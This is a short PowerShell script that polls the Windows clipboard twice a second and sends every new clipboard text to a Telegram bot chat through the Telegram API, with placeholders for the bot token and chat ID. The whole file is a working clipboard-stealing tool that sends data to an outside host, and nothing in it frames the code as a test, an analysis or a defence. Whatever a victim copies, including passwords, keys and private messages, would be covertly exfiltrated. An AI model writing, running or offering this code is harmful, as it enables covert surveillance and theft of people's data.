Add-Type -AssemblyName System.Windows.Forms
$previousClipboard = ""

# Replace with your Telegram bot token and chat ID
$botToken = "<your-bot-token>"   # Replace this with your bot's token
$chatId = "<your-chat-id>"       # Replace this with your Telegram chat ID

# Function to send clipboard data to Telegram
function Send-ClipboardDataToTelegram {
    param (
        [string]$clipboardContent
    )

    $url = "https://api.telegram.org/bot$($botToken)/sendMessage"
    $body = @{
        chat_id = $chatId
        text    = "Clipboard Content: `"$clipboardContent`""
        parse_mode = "Markdown"
    }

    try {
        $response = Invoke-RestMethod -Uri $url -Method Post -ContentType "application/json" -Body ($body | ConvertTo-Json -Depth 3)
        Write-Host "Success: Clipboard data sent to Telegram."
    } catch {
        # Print error for debugging
        Write-Host "Error: Failed to send clipboard data to Telegram. Details: $_"
    }
}
while ($true) {
    try {
        $currentClipboard = [System.Windows.Forms.Clipboard]::GetText()
        if ($currentClipboard -ne $previousClipboard -and $currentClipboard -ne "") {
            $previousClipboard = $currentClipboard
            Write-Host "Detected clipboard change. Sending data to Telegram..."
            Send-ClipboardDataToTelegram -clipboardContent $currentClipboard
        }
    } catch {
        Write-Host "Error: Unable to read clipboard. Details: $_"
    }
    Start-Sleep -Milliseconds 500
}
